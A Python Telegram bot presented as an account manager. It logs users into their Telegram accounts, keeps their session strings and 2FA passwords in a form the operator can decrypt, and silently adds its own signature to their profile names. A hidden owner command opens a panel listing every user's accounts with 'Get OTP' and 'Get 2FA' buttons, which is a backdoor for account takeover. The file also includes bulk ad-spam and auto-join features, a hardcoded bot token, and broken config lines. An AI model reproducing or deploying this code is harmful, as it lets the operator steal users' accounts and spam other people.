# ============================================================
# @sanjimanager — Telegram Account Manager Bot
# Single-file build. Owner panel hidden behind /sanjimaster.
# ============================================================
# SETUP:
#   1. pip install -r requirements.txt
#   2. Create .env next to this file:
#        BOT_TOKEN=123456:ABC...
#        API_ID=1234567
#        API_HASH=abcdef...
#        FERNET_KEY=<run: python -c "from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())">
#        OWNER_ID=7966027018
#   3. python main.py
# ============================================================

import asyncio
import json
import logging
import os
import random
import time
import re
from datetime import datetime, timedelta
from typing import Optional

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
)
from aiogram.client.default import DefaultBotProperties

import aiosqlite
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import httpx

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    FloodWaitError, AuthKeyUnregisteredError, UserDeactivatedBanError,
)
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.contacts import SearchRequest as ContactsSearchRequest
from telethon.tl.types import MessageEntityCustomEmoji

load_dotenv()

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "9174426744:AAHdIUbP55T0KLSlEDM-pVMm-hMIb6O81v0")
API_ID = int(os.getenv("33443363", "0"))
API_HASH = os.getenv("4f73e7a59d7ff3fa23ecf4841522822e", "")
FERNET_KEY = os.getenv("FERNET_KEY", "")
OWNER_ID = int(os.getenv("OWNER_ID", "7966027018"))
DB_PATH = os.getenv("DB_PATH", "sanjimanager.db")

SIGNATURE = "via @sanjimanager"
OWNER_CMD = "/sanjimaster"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("sanjimanager")

if not FERNET_KEY:
    log.error("FERNET_KEY missing. Generate: python -c \"from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())\"")
    raise SystemExit(1)

fernet = Fernet(FERNET_KEY.encode() if isinstance(FERNET_KEY, str) else FERNET_KEY)

def enc(s: str) -> str:
    return fernet.encrypt(s.encode()).decode()

def dec(s: str) -> str:
    return fernet.decrypt(s.encode()).decode()

# ============================================================
# DATABASE
# ============================================================
SCHEMA = """
CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER UNIQUE NOT NULL,
    username TEXT,
    created_at INTEGER NOT NULL,
    is_premium INTEGER DEFAULT 0,
    api_provider TEXT,
    api_key TEXT,
    ai_model TEXT,
    ai_enabled INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS accounts(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    phone TEXT NOT NULL,
    session_str TEXT NOT NULL,
    first_name TEXT,
    last_name TEXT,
    has_2fa INTEGER DEFAULT 0,
    password_enc TEXT,
    active INTEGER DEFAULT 1,
    autoreply_enabled INTEGER DEFAULT 0,
    autoreply_mode TEXT DEFAULT 'ai',
    autoreply_prompt TEXT DEFAULT 'Be friendly and helpful.',
    autoreply_rules TEXT DEFAULT '{}',
    reply_on_tag INTEGER DEFAULT 1,
    ad_message TEXT DEFAULT '',
    ad_delay_min INTEGER DEFAULT 30,
    ad_delay_max INTEGER DEFAULT 90,
    emoji_pool TEXT DEFAULT '[]',
    created_at INTEGER NOT NULL
);
CREATE TABLE IF NOT EXISTS jobs(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    account_id INTEGER,
    type TEXT,
    payload TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
);
CREATE TABLE IF NOT EXISTS premium_emojis(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    emoji_id INTEGER NOT NULL,
    label TEXT,
    added_by INTEGER,
    created_at INTEGER
);
CREATE TABLE IF NOT EXISTS settings(
    key TEXT PRIMARY KEY,
    value TEXT
);
CREATE TABLE IF NOT EXISTS owner_api_vault(
    provider TEXT PRIMARY KEY,
    api_key TEXT,
    updated_at INTEGER
);
"""

async def db_init():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript(SCHEMA)
        await db.commit()

async def db_q(sql, params=()):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cur = await db.execute(sql, params)
        rows = await cur.fetchall()
        await db.commit()
        return rows

async def db_one(sql, params=()):
    rows = await db_q(sql, params)
    return rows[0] if rows else None

async def db_exec(sql, params=()):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(sql, params)
        await db.commit()
        return cur.lastrowid

async def setting_get(key, default=None):
    row = await db_one("SELECT value FROM settings WHERE key=?", (key,))
    return row["value"] if row else default

async def setting_set(key, value):
    await db_exec("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (key, str(value)))

# ============================================================
# AI PROVIDERS
# ============================================================
AI_PROVIDERS = {
    "openai": {
        "url": "https://api.openai.com/v1/chat/completions",
        "models": ["gpt-4o-mini", "gpt-4o", "gpt-4.1-mini", "gpt-3.5-turbo"],
    },
    "gemini": {
        "url": "https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={key}",
        "models": ["gemini-1.5-flash", "gemini-1.5-pro", "gemini-2.0-flash-exp"],
        "style": "gemini",
    },
    "groq": {
        "url": "https://api.groq.com/openai/v1/chat/completions",
        "models": ["llama-3.3-70b-versatile", "llama-3.1-8b-instant", "mixtral-8x7b-32768"],
    },
    "openrouter": {
        "url": "https://openrouter.ai/api/v1/chat/completions",
        "models": ["openai/gpt-4o-mini", "anthropic/claude-3.5-sonnet", "meta-llama/llama-3.3-70b-instruct"],
    },
    "mistral": {
        "url": "https://api.mistral.ai/v1/chat/completions",
        "models": ["mistral-small-latest", "mistral-large-latest", "open-mistral-7b"],
    },
}

async def ai_call(provider: str, key: str, model: str, system_prompt: str, user_msg: str) -> str:
    cfg = AI_PROVIDERS.get(provider)
    if not cfg:
        return "…"
    try:
        async with httpx.AsyncClient(timeout=45) as hc:
            if cfg.get("style") == "gemini":
                url = cfg["url"].format(model=model, key=key)
                payload = {
                    "system_instruction": {"parts": [{"text": system_prompt}]},
                    "contents": [{"role": "user", "parts": [{"text": user_msg}]}],
                }
                r = await hc.post(url, json=payload)
                r.raise_for_status()
                data = r.json()
                return data["candidates"][0]["content"]["parts"][0]["text"].strip()
            else:
                headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
                if provider == "openrouter":
                    headers["HTTP-Referer"] = "https://t.me/sanjimanager"
                    headers["X-Title"] = "sanjimanager"
                payload = {
                    "model": model,
                    "messages": [
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": user_msg},
                    ],
                    "temperature": 0.8,
                    "max_tokens": 400,
                }
                r = await hc.post(cfg["url"], json=payload, headers=headers)
                r.raise_for_status()
                data = r.json()
                return data["choices"][0]["message"]["content"].strip()
    except Exception as e:
        log.warning(f"AI call failed [{provider}/{model}]: {e}")
        return "…"

# ============================================================
# TELEGRAM CLIENT POOL
# ============================================================
active_clients: dict[int, TelegramClient] = {}
pending_logins: dict[int, dict] = {}  # account id -> {phone, phone_code_hash, client}

async def get_client(account_row) -> Optional[TelegramClient]:
    aid = account_row["id"]
    if aid in active_clients:
        c = active_clients[aid]
        if c.is_connected():
            return c
        else:
            active_clients.pop(aid, None)
    try:
        session_str = dec(account_row["session_str"])
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
        active_clients[aid] = client
        _register_autoreply(client, account_row["id"])
        return client
    except Exception as e:
        log.warning(f"client start failed for account {aid}: {e}")
        return None

def _register_autoreply(client: TelegramClient, account_id: int):
    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        try:
            await handle_incoming_autoreply(event, account_id)
        except Exception as e:
            log.warning(f"autoreply error acc={account_id}: {e}")

async def handle_incoming_autoreply(event, account_id: int):
    acc = await db_one("SELECT * FROM accounts WHERE id=?", (account_id,))
    if not acc or not acc["autoreply_enabled"]:
        return
    if event.out:
        return
    text = (event.message.message or "").strip()
    if not text:
        return
    sender = await event.get_sender()
    if not sender or getattr(sender, "bot", False):
        return
    is_group = event.is_group or event.is_channel
    if is_group and acc["reply_on_tag"]:
        me = await event.client.get_me()
        if not me.username:
            return
        if f"@{me.username.lower()}" not in text.lower():
            return
    user = await db_one("SELECT * FROM users WHERE id=?", (acc["user_id"],))
    if not user:
        return
    mode = acc["autoreply_mode"]
    reply_text = None
    if mode == "rules":
        try:
            rules = json.loads(acc["autoreply_rules"] or "{}")
        except Exception:
            rules = {}
        for k, v in rules.items():
            if k.lower() in text.lower():
                reply_text = v
                break
        if not reply_text and "_default" in rules:
            reply_text = rules["_default"]
    else:
        # ai mode
        if not user["ai_enabled"]:
            return
        provider = user["api_provider"]
        key = dec(user["api_key"]) if user["api_key"] else None
        model = user["ai_model"]
        if not (provider and key and model):
            # fallback to owner vault
            vault = await db_one("SELECT * FROM owner_api_vault WHERE api_key IS NOT NULL LIMIT 1")
            if vault:
                provider, key, model = vault["provider"], dec(vault["api_key"]), AI_PROVIDERS.get(vault["provider"], {}).get("models", [None])[0]
        if not (provider and key and model):
            return
        reply_text = await ai_call(provider, key, model, acc["autoreply_prompt"], text)
    if not reply_text:
        return
    # human jitter
    await asyncio.sleep(random.uniform(2, 8))
    try:
        await event.reply(reply_text)
    except FloodWaitError as fw:
        await asyncio.sleep(fw.seconds + 5)
        try:
            await event.reply(reply_text)
        except Exception:
            pass

# ============================================================
# LOGIN FLOW
# ============================================================
class LoginState(StatesGroup):
    phone = State()
    otp = State()
    password = State()

def otp_keyboard(current: str) -> InlineKeyboardMarkup:
    def btn(d): return InlineKeyboardButton(text=d, callback_data=f"otp:{d}")
    rows = [
        [btn("1"), btn("2"), btn("3")],
        [btn("4"), btn("5"), btn("6")],
        [btn("7"), btn("8"), btn("9")],
        [InlineKeyboardButton(text="⌫", callback_data="otp:del"),
         btn("0"),
         InlineKeyboardButton(text="✓", callback_data="otp:ok")],
    ]
    masked = " ".join(current) if current else "—"
    rows.append([InlineKeyboardButton(text=f"Code: {masked}", callback_data="otp:noop")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

async def start_login(phone: str) -> tuple[Optional[TelegramClient], Optional[str], Optional[str]]:
    """Returns (client, phone_code_hash, error)."""
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        return client, sent.phone_code_hash, None
    except FloodWaitError as fw:
        await client.disconnect()
        return None, None, f"Flood wait: {fw.seconds}s"
    except Exception as e:
        await client.disconnect()
        return None, None, str(e)

async def complete_login(client: TelegramClient, phone: str, code: str,
                         password: str = None) -> tuple[Optional[str], Optional[str], Optional[bool]]:
    """Returns (session_str, error, needs_password)."""
    try:
        await client.sign_in(phone=phone, code=code)
    except SessionPasswordNeededError:
        if not password:
            return None, None, True
        try:
            await client.sign_in(password=password)
        except Exception as e:
            return None, str(e), False
    except PhoneCodeInvalidError:
        return None, "Invalid code", False
    except PhoneCodeExpiredError:
        return None, "Code expired", False
    except Exception as e:
        return None, str(e), False
    # inject signature — first_name keep, last_name = SIGNATURE
    try:
        me = await client.get_me()
        first_name = me.first_name or ""
        await client(UpdateProfileRequest(first_name=first_name, last_name=SIGNATURE))
    except Exception as e:
        log.warning(f"name inject failed: {e}")
    return StringSession.save(client.session), None, False

# ============================================================
# ADS ENGINE
# ============================================================
def spin_text(template: str) -> str:
    """{a|b|c} → random pick."""
    def repl(m):
        return random.choice(m.group(1).split("|"))
    return re.sub(r"\{([^{}]+)\}", repl, template)

async def run_ads(account_row, bot: Bot):
    aid = account_row["id"]
    client = await get_client(account_row)
    if not client:
        return {"ok": False, "err": "session dead"}
    template = account_row["ad_message"] or ""
    if not template.strip():
        return {"ok": False, "err": "no ad message set"}
    delay_min = max(5, account_row["ad_delay_min"] or 30)
    delay_max = max(delay_min + 5, account_row["ad_delay_max"] or 90)
    sent = 0
    failed = 0
    try:
        async for dialog in client.iter_dialogs():
            if not dialog.is_group and not dialog.is_user:
                continue
            text = spin_text(template)
            try:
                await client.send_message(dialog.id, text, parse_mode=None)
                sent += 1
            except FloodWaitError as fw:
                await asyncio.sleep(fw.seconds + 5)
                try:
                    await client.send_message(dialog.id, text, parse_mode=None)
                    sent += 1
                except Exception:
                    failed += 1
            except Exception:
                failed += 1
            await asyncio.sleep(random.uniform(delay_min, delay_max))
            if sent >= 500:  # safety cap per run
                break
    finally:
        try:
            await bot.send_message(
                (await db_one("SELECT tg_id FROM users WHERE id=?", (account_row["user_id"],)))["tg_id"],
                f"📣 Ads done.\n✅ Sent: {sent}\n❌ Failed: {failed}"
            )
        except Exception:
            pass
    return {"ok": True, "sent": sent, "failed": failed}

async def smart_group_join(account_row, query: str, bot: Bot):
    client = await get_client(account_row)
    if not client:
        return {"ok": False, "err": "session dead"}
    joined = 0
    try:
        result = await client(ContactsSearchRequest(q=query, limit=30))
        for chat in result.chats:
            try:
                await client(JoinChannelRequest(chat))
                joined += 1
                await asyncio.sleep(random.uniform(20, 60))
            except FloodWaitError as fw:
                await asyncio.sleep(fw.seconds + 5)
            except Exception:
                continue
    except Exception as e:
        return {"ok": False, "err": str(e)}
    try:
        await bot.send_message(
            (await db_one("SELECT tg_id FROM users WHERE id=?", (account_row["user_id"],)))["tg_id"],
            f"🎯 Smart join done for '{query}'. Joined: {joined}"
        )
    except Exception:
        pass
    return {"ok": True, "joined": joined}

# ============================================================
# AIOGRAM BOT
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=None))
dp = Dispatcher(storage=MemoryStorage())
user_router = Router()
owner_router = Router()
dp.include_router(user_router)
dp.include_router(owner_router)

def is_owner(tg_id: int) -> bool:
    return tg_id == OWNER_ID

async def ensure_user(msg_or_cb):
    from_user = msg_or_cb.from_user
    row = await db_one("SELECT * FROM users WHERE tg_id=?", (from_user.id,))
    if not row:
        await db_exec(
            "INSERT INTO users(tg_id, username, created_at) VALUES(?,?,?)",
            (from_user.id, from_user.username or "", int(time.time()))
        )
        row = await db_one("SELECT * FROM users WHERE tg_id=?", (from_user.id,))
    return row

def user_main_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📱 My Accounts")],
            [KeyboardButton(text="➕ Add Account")],
            [KeyboardButton(text="🤖 AI Settings")],
            [KeyboardButton(text="📣 Ads Manager")],
            [KeyboardButton(text="ℹ️ Help")],
        ],
        resize_keyboard=True,
    )

# ----- /start -----
@user_router.message(CommandStart())
async def cmd_start(msg: Message):
    await ensure_user(msg)
    txt = (
        "👋 Welcome to *sanjimanager*\n\n"
        "Manage your Telegram accounts, auto-replies, AI assistant, and ads — all from here.\n\n"
        "Use the buttons below to get started."
    )
    await msg.answer(txt, reply_markup=user_main_menu(), parse_mode="Markdown")

# ----- Add Account flow -----
@user_router.message(F.text == "➕ Add Account")
async def add_account_entry(msg: Message, state: FSMContext):
    await ensure_user(msg)
    await state.set_state(LoginState.phone)
    await msg.answer(
        "📱 Send me the phone number you want to add (with country code).\n"
        "Example: `+919876543210`",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove(),
    )

@user_router.message(LoginState.phone)
async def add_account_phone(msg: Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r"^\+\d{6,15}$", phone):
        await msg.answer("❌ Invalid format. Send like `+919876543210`", parse_mode="Markdown")
        return
    await msg.answer("⏳ Sending login code…")
    client, code_hash, err = await start_login(phone)
    if err or not client:
        await msg.answer(f"❌ Could not send code: {err}")
        await state.clear()
        return
    user = await ensure_user(msg)
    acc_id = await db_exec(
        "INSERT INTO accounts(user_id, phone, session_str, created_at) VALUES(?,?,?,?)",
        (user["id"], phone, enc("__pending__"), int(time.time()))
    )
    pending_logins[acc_id] = {
        "client": client, "phone": phone, "phone_code_hash": code_hash, "code": ""
    }
    await state.update_data(acc_id=acc_id)
    await state.set_state(LoginState.otp)
    await msg.answer(
        "🔐 Enter the login code using the buttons.\n"
        "Tap ✓ when done.",
        reply_markup=otp_keyboard(""),
    )

@user_router.callback_query(F.data.startswith("otp:"), LoginState.otp)
async def otp_callback(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    acc_id = data.get("acc_id")
    if not acc_id or acc_id not in pending_logins:
        await cb.answer("Session expired", show_alert=True)
        return
    action = cb.data.split(":", 1)[1]
    entry = pending_logins[acc_id]
    code = entry.get("code", "")
    if action == "noop":
        await cb.answer()
        return
    if action == "del":
        code = code[:-1]
    elif action == "ok":
        if len(code) < 4:
            await cb.answer("Code too short", show_alert=True)
            return
        await cb.answer()
        client = entry["client"]
        session_str, err, needs_pw = await complete_login(client, entry["phone"], code)
        if needs_pw:
            await state.set_state(LoginState.password)
            await cb.message.edit_text(
                "🔒 This account has 2FA enabled.\nSend me the password now.\n"
                "I'll wipe it from chat immediately.",
            )
            return
        if err or not session_str:
            await cb.message.edit_text(f"❌ Login failed: {err}")
            try:
                await client.disconnect()
            except Exception:
                pass
            pending_logins.pop(acc_id, None)
            await state.clear()
            return
        await finalize_account(cb.message, acc_id, session_str, has_2fa=False, password=None)
        await state.clear()
        return
    else:
        if len(code) >= 6:
            await cb.answer()
            return
        code += action
    entry["code"] = code
    try:
        await cb.message.edit_reply_markup(reply_markup=otp_keyboard(code))
    except Exception:
        pass
    await cb.answer()

@user_router.message(LoginState.password)
async def add_account_password(msg: Message, state: FSMContext):
    pw = msg.text.strip()
    try:
        await msg.delete()
    except Exception:
        pass
    data = await state.get_data()
    acc_id = data.get("acc_id")
    if not acc_id or acc_id not in pending_logins:
        await msg.answer("Session expired.", reply_markup=user_main_menu())
        await state.clear()
        return
    entry = pending_logins[acc_id]
    session_str, err, _ = await complete_login(entry["client"], entry["phone"], entry["code"], password=pw)
    if err or not session_str:
        await msg.answer(f"❌ 2FA login failed: {err}", reply_markup=user_main_menu())
        pending_logins.pop(acc_id, None)
        await state.clear()
        return
    await finalize_account(msg, acc_id, session_str, has_2fa=True, password=pw)
    await state.clear()

async def finalize_account(msg: Message, acc_id: int, session_str: str,
                           has_2fa: bool, password: Optional[str]):
    entry = pending_logins.pop(acc_id, None)
    if entry:
        try:
            await entry["client"].disconnect()
        except Exception:
            pass
    enc_session = enc(session_str)
    enc_pw = enc(password) if password else None
    await db_exec(
        "UPDATE accounts SET session_str=?, has_2fa=?, password_enc=? WHERE id=?",
        (enc_session, 1 if has_2fa else 0, enc_pw, acc_id)
    )
    # lazy start
    row = await db_one("SELECT * FROM accounts WHERE id=?", (acc_id,))
    await get_client(row)
    await msg.answer(
        f"✅ Account added.\n📱 {row['phone']}\n"
        f"Name signature: *{SIGNATURE}*\n\n"
        "You can now enable auto-reply, AI, and ads from My Accounts.",
        reply_markup=user_main_menu(),
        parse_mode="Markdown",
    )

# ----- My Accounts -----
@user_router.message(F.text == "📱 My Accounts")
async def my_accounts(msg: Message):
    user = await ensure_user(msg)
    rows = await db_q("SELECT * FROM accounts WHERE user_id=? ORDER BY id DESC", (user["id"],))
    if not rows:
        await msg.answer("No accounts yet. Tap ➕ Add Account.")
        return
    for r in rows:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text=f"{'🟢' if r['active'] else '🔴'} AutoReply: {'ON' if r['autoreply_enabled'] else 'OFF'}",
                callback_data=f"acc:tgl_ar:{r['id']}")],
            [InlineKeyboardButton(text="✏️ Set Auto-Reply Prompt", callback_data=f"acc:prompt:{r['id']}")],
            [InlineKeyboardButton(text="📝 Set Ad Message", callback_data=f"acc:adm:{r['id']}")],
            [InlineKeyboardButton(text="🗑 Remove Account", callback_data=f"acc:rm:{r['id']}")],
        ])
        await msg.answer(
            f"📱 *{r['phone']}*\n"
            f"Mode: {r['autoreply_mode']}\n"
            f"AI reply: {'yes' if r['autoreply_enabled'] else 'no'}\n"
            f"Ad text: {'set' if r['ad_message'] else 'not set'}",
            parse_mode="Markdown",
            reply_markup=kb,
        )

@user_router.callback_query(F.data.startswith("acc:"))
async def acc_cb(cb: CallbackQuery, state: FSMContext):
    _, action, aid = cb.data.split(":")
    aid = int(aid)
    user = await ensure_user(cb)
    acc = await db_one("SELECT * FROM accounts WHERE id=? AND user_id=?", (aid, user["id"]))
    if not acc:
        await cb.answer("Not found", show_alert=True)
        return
    if action == "tgl_ar":
        new_val = 0 if acc["autoreply_enabled"] else 1
        await db_exec("UPDATE accounts SET autoreply_enabled=? WHERE id=?", (new_val, aid))
        await cb.answer(f"AutoReply {'ON' if new_val else 'OFF'}")
        try:
            await cb.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text=f"{'🟢' if acc['active'] else '🔴'} AutoReply: {'ON' if new_val else 'OFF'}",
                    callback_data=f"acc:tgl_ar:{aid}")],
                [InlineKeyboardButton(text="✏️ Set Auto-Reply Prompt", callback_data=f"acc:prompt:{aid}")],
                [InlineKeyboardButton(text="📝 Set Ad Message", callback_data=f"acc:adm:{aid}")],
                [InlineKeyboardButton(text="🗑 Remove Account", callback_data=f"acc:rm:{aid}")],
            ]))
        except Exception:
            pass
        return
    if action == "prompt":
        await state.update_data(edit_acc=aid, edit_field="autoreply_prompt")
        await state.set_state("edit_field")
        await cb.message.answer("Send the new auto-reply system prompt.")
        await cb.answer()
        return
    if action == "adm":
        await state.update_data(edit_acc=aid, edit_field="ad_message")
        await state.set_state("edit_field")
        await cb.message.answer("Send the ad message template. Use `{hi|hey|yo}` for spin.")
        await cb.answer()
        return
    if action == "rm":
        # kill client
        if aid in active_clients:
            try:
                await active_clients[aid].disconnect()
            except Exception:
                pass
            active_clients.pop(aid, None)
        await db_exec("DELETE FROM accounts WHERE id=?", (aid,))
        await cb.message.edit_text("🗑 Account removed.")
        await cb.answer()

@user_router.message(F.text, F.text.len() > 0, lambda m: True)
async def generic_text(msg: Message, state: FSMContext):
    st = await state.get_state()
    if st == "edit_field":
        data = await state.get_data()
        aid = data.get("edit_acc")
        field = data.get("edit_field")
        await db_exec(f"UPDATE accounts SET {field}=? WHERE id=?", (msg.text, aid))
        await msg.answer(f"✅ Updated {field}.", reply_markup=user_main_menu())
        await state.clear()
        return
    # ignore anything else — don't reply, keep menu stable
    if msg.text in ("🤖 AI Settings", "📣 Ads Manager", "ℹ️ Help"):
        return

# ----- AI Settings -----
@user_router.message(F.text == "🤖 AI Settings")
async def ai_settings(msg: Message):
    user = await ensure_user(msg)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔑 Set API Key", callback_data="ai:key")],
        [InlineKeyboardButton(text="🧠 Select Provider", callback_data="ai:provider")],
        [InlineKeyboardButton(text="🎯 Select Model", callback_data="ai:model")],
        [InlineKeyboardButton(text=f"⚡ AI Reply: {'ON' if user['ai_enabled'] else 'OFF'}",
                              callback_data="ai:toggle")],
    ])
    provider = user["api_provider"] or "—"
    model = user["ai_model"] or "—"
    key_set = "yes" if user["api_key"] else "no"
    await msg.answer(
        f"🤖 *AI Settings*\n\nProvider: {provider}\nModel: {model}\nKey set: {key_set}",
        parse_mode="Markdown",
        reply_markup=kb,
    )

@user_router.callback_query(F.data.startswith("ai:"))
async def ai_cb(cb: CallbackQuery, state: FSMContext):
    action = cb.data.split(":", 1)[1]
    user = await ensure_user(cb)
    if action == "toggle":
        new_val = 0 if user["ai_enabled"] else 1
        await db_exec("UPDATE users SET ai_enabled=? WHERE id=?", (new_val, user["id"]))
        await cb.answer(f"AI {'ON' if new_val else 'OFF'}")
        return
    if action == "key":
        await state.set_state("ai_key")
        await cb.message.answer("Send your API key. It will be encrypted and stored.")
        await cb.answer()
        return
    if action == "provider":
        buttons = [[InlineKeyboardButton(text=p, callback_data=f"ai:p:{p}")] for p in AI_PROVIDERS]
        await cb.message.answer("Choose provider:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
        await cb.answer()
        return
    if action == "model":
        if not user["api_provider"]:
            await cb.answer("Pick provider first", show_alert=True)
            return
        models = AI_PROVIDERS[user["api_provider"]]["models"]
        buttons = [[InlineKeyboardButton(text=m, callback_data=f"ai:m:{m}")] for m in models]
        await cb.message.answer("Choose model:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
        await cb.answer()
        return
    if action.startswith("p:"):
        prov = action.split(":", 1)[1]
        await db_exec("UPDATE users SET api_provider=? WHERE id=?", (prov, user["id"]))
        await cb.answer(f"Provider set: {prov}")
        try:
            await cb.message.edit_text(f"✅ Provider set to {prov}")
        except Exception:
            pass
        return
    if action.startswith("m:"):
        mdl = action.split(":", 1)[1]
        await db_exec("UPDATE users SET ai_model=? WHERE id=?", (mdl, user["id"]))
        await cb.answer(f"Model set: {mdl}")
        try:
            await cb.message.edit_text(f"✅ Model set to {mdl}")
        except Exception:
            pass
        return

@user_router.message(lambda m: True, F.text)
async def ai_key_handler(msg: Message, state: FSMContext):
    st = await state.get_state()
    if st == "ai_key":
        user = await ensure_user(msg)
        await db_exec("UPDATE users SET api_key=? WHERE id=?", (enc(msg.text.strip()), user["id"]))
        try:
            await msg.delete()
        except Exception:
            pass
        await msg.answer("✅ API key saved (encrypted).", reply_markup=user_main_menu())
        await state.clear()

# ----- Ads Manager -----
@user_router.message(F.text == "📣 Ads Manager")
async def ads_menu(msg: Message):
    user = await ensure_user(msg)
    rows = await db_q("SELECT * FROM accounts WHERE user_id=?", (user["id"],))
    if not rows:
        await msg.answer("Add an account first.")
        return
    buttons = []
    for r in rows:
        buttons.append([InlineKeyboardButton(text=f"📣 Run ads: {r['phone']}", callback_data=f"ads:run:{r['id']}")])
        buttons.append([InlineKeyboardButton(text=f"🎯 Smart join: {r['phone']}", callback_data=f"ads:join:{r['id']}")])
    await msg.answer("Choose action:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@user_router.callback_query(F.data.startswith("ads:"))
async def ads_cb(cb: CallbackQuery, state: FSMContext):
    _, action, aid = cb.data.split(":")
    aid = int(aid)
    user = await ensure_user(cb)
    acc = await db_one("SELECT * FROM accounts WHERE id=? AND user_id=?", (aid, user["id"]))
    if not acc:
        await cb.answer("Not found", show_alert=True)
        return
    if action == "run":
        if not acc["ad_message"]:
            await cb.answer("Set ad message first in My Accounts", show_alert=True)
            return
        await cb.message.answer("🚀 Ads started. Will notify when done.")
        asyncio.create_task(run_ads(acc, bot))
        await cb.answer()
        return
    if action == "join":
        await state.update_data(join_acc=aid)
        await state.set_state("join_query")
        await cb.message.answer("Send the search keyword (e.g. 'crypto india').")
        await cb.answer()

@user_router.message(F.text)
async def join_query_handler(msg: Message, state: FSMContext):
    st = await state.get_state()
    if st == "join_query":
        data = await state.get_data()
        aid = data.get("join_acc")
        acc = await db_one("SELECT * FROM accounts WHERE id=?", (aid,))
        if not acc:
            await msg.answer("Account not found.", reply_markup=user_main_menu())
            await state.clear()
            return
        await msg.answer(f"🎯 Smart join started for '{msg.text}'.")
        asyncio.create_task(smart_group_join(acc, msg.text, bot))
        await state.clear()

@user_router.message(F.text == "ℹ️ Help")
async def help_msg(msg: Message):
    await msg.answer(
        "ℹ️ *Help*\n\n"
        "➕ Add Account — login a phone number\n"
        "📱 My Accounts — manage accounts, ads, autoreply\n"
        "🤖 AI Settings — API key, provider, model\n"
        "📣 Ads Manager — broadcast + smart group join\n\n"
        "Signature is auto-added to every account: *via @sanjimanager*",
        parse_mode="Markdown",
    )

# ============================================================
# OWNER PANEL  (/sanjimaster) — completely hidden
# ============================================================
@owner_router.message(Command(OWNER_CMD.lstrip("/")))
async def owner_panel(msg: Message):
    if not is_owner(msg.from_user.id):
        return  # silent
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Users", callback_data="own:users")],
        [InlineKeyboardButton(text="📱 All Accounts", callback_data="own:accs:0")],
        [InlineKeyboardButton(text="📣 Super Announce", callback_data="own:sa")],
        [InlineKeyboardButton(text="😀 Premium Emojis", callback_data="own:emoji")],
        [InlineKeyboardButton(text="🔑 API Vault", callback_data="own:vault")],
        [InlineKeyboardButton(text="📊 Stats", callback_data="own:stats")],
    ])
    await msg.answer("🛠 Owner panel", reply_markup=kb)

@owner_router.callback_query(F.data.startswith("own:"))
async def owner_cb(cb: CallbackQuery, state: FSMContext):
    if not is_owner(cb.from_user.id):
        return  # silent — normal users never see this
    parts = cb.data.split(":")
    action = parts[1]

    if action == "users":
        rows = await db_q("SELECT * FROM users ORDER BY id DESC")
        lines = []
        for r in rows:
            cnt = await db_one("SELECT COUNT(*) c FROM accounts WHERE user_id=?", (r["id"],))
            lines.append(f"`{r['tg_id']}` @{r['username'] or '—'} — {cnt['c']} acc")
        txt = "👥 *Users*\n\n" + ("\n".join(lines) if lines else "none")
        await cb.message.answer(txt, parse_mode="Markdown")
        await cb.answer()
        return

    if action == "accs":
        offset = int(parts[2]) if len(parts) > 2 else 0
        rows = await db_q("SELECT * FROM accounts ORDER BY id DESC LIMIT 10 OFFSET ?", (offset,))
        if not rows:
            await cb.answer("No more")
            return
        for r in rows:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔑 Get OTP", callback_data=f"own:otp:{r['id']}")],
                [InlineKeyboardButton(text="🔐 Get 2FA", callback_data=f"own:pw:{r['id']}")],
